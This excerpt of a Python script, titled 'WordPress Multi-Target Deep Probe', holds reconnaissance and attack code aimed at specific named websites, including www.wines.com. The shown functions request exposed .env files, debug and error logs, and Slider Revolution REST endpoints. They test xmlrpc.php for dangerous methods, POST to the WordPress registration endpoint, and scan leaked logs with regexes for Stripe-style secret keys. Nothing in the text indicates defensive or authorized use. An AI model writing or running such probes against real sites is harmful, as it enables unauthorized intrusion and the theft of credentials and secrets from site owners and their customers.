...
def req(url, method="GET", data=None, headers=None, timeout=15, allow_redirects=True):
    ...
    try:
        if method == "GET":
            r = requests.get(
                url, headers=hdrs, timeout=timeout, verify=False, allow_redirects=allow_redirects
            )
        elif method == "POST":
            r = requests.post(
                url,
...
def scan_error_log(log_text):
    ...
    api_keys = set()
    for pat in [
        r"sk-[a-zA-Z0-9]{20,60}",  # Stripe secret key
...
def probe(
    target, host=None, paths=None, cors_eps=None, xmlrpc_paths=None, staging=None, js_limit=10
):
    """
    ...
    if r.status_code == 200:
        ...
        for js in js_urls:
            if js.startswith("http"):
                ...
                full_urls.append("https:" + js)
            else:
                full_urls.append(f"https://{host}{js}")
    ...
    for xpath in xmlrpc_paths or ["/xmlrpc.php"]:
        ...
        if r_post.status_code == 200 and len(r_post.text) > 100:
            ...
            findings.append(
                f"  POST → HTTP 200 | {len(methods)} methods | Dangerous: {', '.join(found)}\n"
            )
    ...
    if staging:
        ...
        findings.append(
            f"### Staging: {subdomain} → HTTP {r.status_code} | {r.headers.get('Server', '?')}\n"
        )
        if r.status_code == 200:
...
def probe_wines():
    probe(
        ...
        paths=[
            "/magical/.env",
            "/magical/wp-content/debug.log",
            "/magical/error_log",
            "/magical/wp-content/plugins/elementor/readme.txt",
    ...
    r = req(
        "https://www.wines.com/magical/wp-login.php?action=register",
        method="POST",
...
def probe_toolking():
    ...
    for ep in ["/wp-json/sliderrevolution/sliders/1", "/wp-json/sliderrevolution/sliders/slides/1"]:
...
if __name__ == "__main__":
    ...
    print("WordPress Multi-Target Deep Probe")
